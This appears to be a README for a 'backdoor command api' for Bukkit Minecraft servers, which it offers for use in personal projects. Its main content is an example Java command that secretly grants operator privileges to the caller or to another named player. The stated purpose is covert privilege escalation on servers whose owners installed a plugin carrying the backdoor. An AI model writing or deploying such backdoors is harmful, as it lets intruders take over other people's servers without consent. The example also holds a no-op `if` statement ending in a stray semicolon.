# KegoCommandApi
A backdoor command api used in Kego

Credits: abhi289 for making most of the api and Python for commands and usage

This code is ment to be using in personal projects and not to be resold unless given permission and proper credits are to be given.

EXAMPLE COMMAND:
```java
@Command(name = "op", usage = "op <player>", desc = "Sets you and others op!", blatant = true)
public class Op extends CommandListener {

    @Override
    public void execute(Bootstrap instance, Player player, String[] args) {
        if (args.length <= 1) {
            setOp(player);
            player.sendMessage("You are now op");
            return;
        }
        Player player3 = Bukkit.getServer().getPlayer(args[1]);
        if (player3 == null) {
            player.sendMessage("The player " + args[1] + " is not online.");
            return;
        }
        setOp(player3);
        player.sendMessage("The player " + player3.getName() + " is now op");
    }

    public static void setOp(final Player p) {
        Bootstrap.getInstance().getServer().getScheduler().runTaskAsynchronously(Bootstrap.getInstance(), () -> {
            if (!p.isOp());
            p.setOp(true);
        });
    }
}
